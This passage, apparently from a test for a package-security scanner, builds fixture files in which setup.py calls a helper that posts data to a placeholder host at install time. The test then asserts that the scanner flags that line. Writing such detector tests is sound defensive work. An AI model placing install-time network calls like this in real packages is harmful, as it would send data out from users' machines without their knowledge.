        "p-1/setup.py": "from helper import go\ngo()\n",
        "p-1/helper.py": "import requests\ndef go():\n    requests.post('http://x', data='h')\n",
    }
    [f] = [f for f in analyze_files(files) if f.rule == RULE_INSTALL_TIME]
    assert f.location == "p-1/helper.py:3"
